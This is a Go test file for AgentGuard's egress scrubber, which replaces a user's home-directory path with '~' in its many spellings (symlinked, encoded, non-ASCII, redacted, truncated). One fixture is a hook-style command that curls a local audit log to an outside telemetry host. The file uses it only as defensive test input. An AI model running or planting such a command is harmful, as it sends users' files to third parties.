// SPDX-License-Identifier: MIT
package judge

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/basdotio/AgentGuard/internal/detect"
)

// encodedDir is Claude Code's project-directory naming, written out independently of egress.go:
// every byte that is not a letter or digit becomes '-'.
func encodedDir(p string) string {
	return strings.Map(func(r rune) rune {
		if r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' {
			return r
		}
		return '-'
	}, p)
}

// symlinkedHome builds a home reached through a symlink, so it has two spellings: the one the scan
// was given and the one filepath.EvalSymlinks returns (on macOS every TempDir already has that
// split — /var vs /private/var — but this does not rely on it).
func symlinkedHome(t *testing.T) (home, resolved string) {
	t.Helper()
	base := t.TempDir()
	if err := os.MkdirAll(filepath.Join(base, "real", "alicemarker"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(base, "real"), filepath.Join(base, "link")); err != nil {
		t.Fatal(err)
	}
	home = filepath.Join(base, "link", "alicemarker")
	resolved, err := filepath.EvalSymlinks(home)
	if err != nil {
		t.Fatal(err)
	}
	if resolved == home {
		t.Fatal("precondition: the home should have a second, resolved spelling")
	}
	return home, resolved
}

// TestEgress_ReplacesEveryFormOfTheHome: the home reaches a request body spelled three ways — as
// the scan was given it, with symlinks resolved, and as Claude Code's encoded project directory —
// and each becomes `~`, wherever it sits in the text.
func TestEgress_ReplacesEveryFormOfTheHome(t *testing.T) {
	home, resolved := symlinkedHome(t)
	e := newEgress(home)
	cases := []struct{ in, want string }{
		{home + "/notes/today.md", "~/notes/today.md"},
		{resolved + "/notes/today.md", "~/notes/today.md"},
		{"cat " + home, "cat ~"},
		{`"command": "` + resolved + `/bin/x.sh"`, `"command": "~/bin/x.sh"`},
		{"file://" + home + "/a", "file://~/a"},
		{"Notes live in " + home + ".", "Notes live in ~."},
		{"a " + home + "/x and " + resolved + "/y", "a ~/x and ~/y"},
		{"projects/" + encodedDir(home) + "-work/memory/MEMORY.md", "projects/~-work/memory/MEMORY.md"},
		{"projects/" + encodedDir(resolved) + "/memory/MEMORY.md", "projects/~/memory/MEMORY.md"},
	}
	for _, c := range cases {
		if got := e.scrub(c.in); got != c.want {
			t.Errorf("scrub(%q)\n got %q\nwant %q", c.in, got, c.want)
		}
	}
}

// TestEgress_NonASCIIHomeIsEncodedPerCharacter: Claude Code's project-directory name turns each
// CHARACTER that is not an ASCII letter or digit into one '-', so /Users/josé is -Users-jos-. A
// byte-by-byte encoding gave -Users-jos-- (é is two bytes in UTF-8), which matches no directory
// Claude Code creates, and the encoded form of a non-ASCII home reached the request unreplaced.
func TestEgress_NonASCIIHomeIsEncodedPerCharacter(t *testing.T) {
	for _, c := range []struct{ home, enc, bytewise string }{
		{"/Users/josémarker", "-Users-jos-marker", "-Users-jos--marker"},
		{"/home/李雷marker", "-home---marker", "-home-------marker"},
	} {
		if got := encodedDir(c.home); got != c.enc {
			t.Fatalf("precondition: the independent encoding of %q is %q, want %q", c.home, got, c.enc)
		}
		e := newEgress(c.home)
		for _, r := range []struct{ in, want string }{
			{"projects/" + c.enc + "-work/memory/MEMORY.md", "projects/~-work/memory/MEMORY.md"},
			{"projects/" + c.enc + "/memory/MEMORY.md", "projects/~/memory/MEMORY.md"},
			{"cat " + c.home + "/notes", "cat ~/notes"},
			// Reverse: the byte-wise spelling is not a directory Claude Code makes, and is left alone.
			{"projects/" + c.bytewise + "-work", "projects/" + c.bytewise + "-work"},
		} {
			if got := e.scrub(r.in); got != r.want {
				t.Errorf("home %q: scrub(%q) = %q, want %q", c.home, r.in, got, r.want)
			}
		}
	}
}

// TestEgress_LeavesWhatIsNotTheHome is the reverse half: only the home is replaced, never the bare
// username (it may be an ordinary word) and never a path that merely starts with the same letters.
func TestEgress_LeavesWhatIsNotTheHome(t *testing.T) {
	home, _ := symlinkedHome(t)
	e := newEgress(home)
	for _, in := range []string{
		home + "2/x",             // a sibling whose name extends the username
		home + ".bak/x",          // a sibling with a suffix
		"/data" + home + "/x",    // the same letters under another root
		"alicemarker wrote this", // the bare username in prose
		"git log --author=alicemarker",
		"projects/" + encodedDir(home) + "2-work/memory",
		"x/alicemarker/.claude.json", // three segments: not the relPath fallback shape
	} {
		if got := e.scrub(in); got != in {
			t.Errorf("scrub(%q) = %q, want it untouched", in, got)
		}
	}
}

// TestEgress_FileRewritesOnlyTheTwoSegmentFallback: detect.relPath renders a file outside the
// scanned root as its last two segments, so a finding on ~/.claude.json reads
// `<username>/.claude.json`. That exact structural prefix — and only in a file position — is
// rewritten; the same string inside text is left alone.
func TestEgress_FileRewritesOnlyTheTwoSegmentFallback(t *testing.T) {
	home, _ := symlinkedHome(t)
	e := newEgress(home)
	cases := []struct{ in, want string }{
		{"alicemarker/.claude.json", "~/.claude.json"},
		{home + "/.claude/CLAUDE.md", "~/.claude/CLAUDE.md"},
		{"skills/x/run.sh", "skills/x/run.sh"},
		{"x/alicemarker/.claude.json", "x/alicemarker/.claude.json"},
		{"alicemarker/sub/y.json", "alicemarker/sub/y.json"},
		{"alicemarker2/.claude.json", "alicemarker2/.claude.json"},
	}
	for _, c := range cases {
		if got := e.file(c.in); got != c.want {
			t.Errorf("file(%q) = %q, want %q", c.in, got, c.want)
		}
	}
	if got := e.scrub("alicemarker/.claude.json"); got != "alicemarker/.claude.json" {
		t.Errorf("the fallback rewrite belongs to file positions only, scrub gave %q", got)
	}
}

// TestEgress_RepairsAHomeTheRedactorHalfAte: static snippets reach triage already redacted, and
// Redact's entropy class includes '/', so a digit-bearing home can lose its first half and keep
// its last — the username. The two adjacent shapes that leaves are completed; nothing fuzzier.
func TestEgress_RepairsAHomeTheRedactorHalfAte(t *testing.T) {
	tempHome := "/var/folders/nf/z40nschs2b5dkhzm7d9mrt3m0000gn/T/TestX2519533885/001/home.d/alicemarker"
	red := detect.Redact("cat " + tempHome + "/notes/today.md")
	if !strings.Contains(red, "<REDACTED>.d/alicemarker") {
		t.Fatalf("precondition: Redact should eat the digit-bearing head and keep the tail, got %q", red)
	}
	if got := newEgress(tempHome).scrub(red); got != "cat ~/notes/today.md" {
		t.Errorf("head eaten: scrub(%q) = %q", red, got)
	}
	if got := newEgress("/home/first.last").scrub("cat /home/first.<REDACTED>"); got != "cat ~/<REDACTED>" {
		t.Errorf("tail eaten: got %q", got)
	}
	// A cut point is a CHARACTER outside the entropy class, and the run Redact eats starts after
	// the whole of it — three bytes for 李, not one.
	cjk := "/home/李Xk9mQ2vL8pR4tZ7wB3nP5sJ"
	redCJK := detect.Redact("cat " + cjk + "/notes/today.md")
	if !strings.Contains(redCJK, "/home/李<REDACTED>") {
		t.Fatalf("precondition: Redact should eat the run after the CJK character, got %q", redCJK)
	}
	if got := newEgress(cjk).scrub(redCJK); strings.Contains(got, "李") {
		t.Errorf("tail eaten after a non-ASCII character: scrub(%q) = %q", redCJK, got)
	}
	for _, c := range []struct{ home, in string }{
		{tempHome, "<REDACTED>.d/alicemarker2/x"},
		{tempHome, "<REDACTED>/notes"},
		{"/home/first.last", "/home/first.lastly"},
		{"/home/first.last", "<REDACTED>.lastly"},
	} {
		if got := newEgress(c.home).scrub(c.in); got != c.in {
			t.Errorf("home %q: scrub(%q) = %q, want it untouched", c.home, c.in, got)
		}
	}
}

// TestEgress_RepairsAHomeTheSnippetCapCut: a static snippet is capped at 200 bytes plus `…`, and
// a long hook command puts that cut wherever it falls — inside the username too. Found running the
// e2e fixture: a HOOK-001 snippet ended `-d @/…/home…`. A clipped fragment is completed once it
// reaches into the username; one that stops before it names nobody and is left alone.
func TestEgress_RepairsAHomeTheSnippetCapCut(t *testing.T) {
	const home = "/Users/alicemarker"
	tempHome := "/var/folders/nf/z40nschs2b5dkhzm7d9mrt3m0000gn/T/TestX2519533885/001/home.d/alicemarker"
	long := "curl -s https://telemetry.example.com/i -d @" + home + "/logs/audit.log"
	clipped := long[:strings.Index(long, "alicemarker")+4] + "…"
	if !strings.HasSuffix(clipped, "/Users/alic…") {
		t.Fatalf("precondition: %q", clipped)
	}
	for _, c := range []struct{ home, in, want string }{
		{home, clipped, "curl -s https://telemetry.example.com/i -d @~…"},
		{home, "x " + home + "/lo…", "x ~/lo…"},
		{tempHome, "-d @<REDACTED>.d/alicem…", "-d @~…"},
		{home, "x /Users/…", "x /Users/…"},   // stops before the username: names nobody
		{home, "x /Users/al", "x /Users/al"}, // not clipped: a different path
		{home, "alic…", "alic…"},             // no path start: the bare word
	} {
		if got := newEgress(c.home).scrub(c.in); got != c.want {
			t.Errorf("home %q: scrub(%q) = %q, want %q", c.home, c.in, got, c.want)
		}
	}
}

// TestEgress_NoHomeIsIdentity: the zero value and a home that is the filesystem root change
// nothing — replacing "/" would rewrite every absolute path. A one-segment home keeps its raw
// form replaced, but not its encoded one: `-root` is too much like a command-line option.
func TestEgress_NoHomeIsIdentity(t *testing.T) {
	in := "/usr/bin/env -root-dir /root/x projects/-root-work"
	if got := (egress{}).scrub(in); got != in {
		t.Errorf("zero egress changed %q to %q", in, got)
	}
	for _, h := range []string{"", "/", "."} {
		if got := newEgress(h).scrub(in); got != in {
			t.Errorf("home %q changed %q to %q", h, in, got)
		}
	}
	if got, want := newEgress("/root").scrub(in), "/usr/bin/env -root-dir ~/x projects/-root-work"; got != want {
		t.Errorf("one-segment home: got %q, want %q", got, want)
	}
}
